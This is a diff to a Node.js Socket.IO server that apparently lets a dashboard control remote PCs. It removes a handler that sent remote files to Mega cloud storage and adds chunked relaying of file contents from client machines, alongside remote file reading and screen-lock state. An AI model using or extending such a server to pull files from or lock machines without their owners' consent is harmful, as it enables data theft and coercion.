@@ -98,13 +98,6 @@ io.on("connection", (socket) => {
             io.to(clientObj.socketId).emit("read_file", { path: filePath });
         });
 
-        // Dashboard -> ask client to save a remote file into Mega
-        socket.on("save_to_mega", ({ nodeId, path: filePath }) => {
-            const clientObj = clients[nodeId];
-            if (!clientObj || !clientObj.socketId || !filePath) return;
-            io.to(clientObj.socketId).emit("save_to_mega", { path: filePath });
-        });
-
         // Dashboard -> upload local file to remote directory
         socket.on("upload_remote_file", ({ nodeId, path: dirPath, name, contentBase64 }) => {
             const clientObj = clients[nodeId];
@@ -123,7 +116,6 @@ io.on("connection", (socket) => {
         const name = data.name;
         const user = data.user;
         const address = data.address;
-        const version = data.version || null;
         // Stable node id used by dashboard and for log directories
         const nodeId = `${user}_${name}_${address}`;
 
@@ -133,7 +125,6 @@ io.on("connection", (socket) => {
         const prevLocked = prev && typeof prev.locked === "boolean" ? prev.locked : false;
         const prevLastLockTs = prev && prev.lastLockTs ? prev.lastLockTs : null;
         const prevLockString = prev && typeof prev.lockString === "string" ? prev.lockString : "";
-        const prevVersion = prev && prev.version ? prev.version : null;
 
         clients[nodeId] = {
             name,
@@ -143,8 +134,7 @@ io.on("connection", (socket) => {
             state: prevState,
             locked: prevLocked,
             lastLockTs: prevLastLockTs,
-            lockString: prevLockString,
-            version: version || prevVersion
+            lockString: prevLockString
         };
 
         console.log(`PC Registered: ${nodeId} = ${socket.id}`);
@@ -303,7 +293,7 @@ io.on("connection", (socket) => {
         });
     });
 
-    // Client PC -> file data for download
+    // Client PC -> file data for download (legacy, single message)
     socket.on("file_data", (payload) => {
         const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
         if (!nodeId) return;
@@ -317,6 +307,62 @@ io.on("connection", (socket) => {
                 name,
                 size,
                 contentBase64,
+                error: error || null
+            });
+        });
+    });
+
+    // Client PC -> file start (chunked transfer)
+    socket.on("file_start", (payload) => {
+        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
+        if (!nodeId) return;
+
+        const { fileId, path: filePath, name, size, error } = payload;
+
+        dashboardSockets.forEach(dash => {
+            dash.emit("file_start", {
+                client: nodeId,
+                fileId,
+                path: filePath,
+                name,
+                size,
+                error: error || null
+            });
+        });
+    });
+
+    // Client PC -> file chunk (chunked transfer)
+    socket.on("file_chunk", (payload) => {
+        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
+        if (!nodeId) return;
+
+        const { fileId, chunkIndex, chunkBase64, isLast } = payload;
+
+        dashboardSockets.forEach(dash => {
+            dash.emit("file_chunk", {
+                client: nodeId,
+                fileId,
+                chunkIndex,
+                chunkBase64,
+                isLast: !!isLast
+            });
+        });
+    });
+
+    // Client PC -> file complete (chunked transfer)
+    socket.on("file_complete", (payload) => {
+        const nodeId = payload.nodeId || Object.keys(clients).find(key => clients[key].socketId === socket.id);
+        if (!nodeId) return;
+
+        const { fileId, path: filePath, name, size, error } = payload;
+
+        dashboardSockets.forEach(dash => {
+            dash.emit("file_complete", {
+                client: nodeId,
+                fileId,
+                path: filePath,
+                name,
+                size,
                 error: error || null
             });
         });
